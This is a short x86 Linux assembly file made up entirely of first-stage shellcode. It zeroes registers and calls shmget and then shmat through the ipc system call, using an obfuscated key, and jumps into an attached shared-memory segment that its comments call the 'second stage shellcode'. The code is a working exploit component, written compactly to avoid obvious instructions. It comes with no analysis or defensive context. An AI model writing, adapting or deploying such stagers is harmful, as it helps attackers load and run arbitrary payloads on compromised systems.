global _start

section .text
_start:
	xor eax, eax
	cdq			; make edx zero, as well

	; ipc(2) has a bunch of parameters, zero them all
	lea ebx, [eax]
	and esi, ebx
	sub edi, edi
	xor ebp, ebp

	mov ecx, 0x35014542	; key in two's complement
	neg ecx			; key
	add bl, 0x17		; shmget (ebx is already zero)
	; edx, esi and ebp are already zero from the above
	or al, 0x75		; eax is already zero
	; int ipc(unsigned int, int, int, int, void *, long)
	int 0x80

	mov esi, esp		; use stack logical address
	mov ecx, eax		; move shm id returned by the shmget above
	dec ebx
	dec ebx			; shmat (0x2 less than shmget)
	; edx, esi and ebp are already zero from the above
	and eax, ebp		; make it zero
	add al, 0x75
	; int ipc(unsigned int, int, int, int, void *, long)
	int 0x80

	jmp [esi]		; finally jump to the second stage shellcode
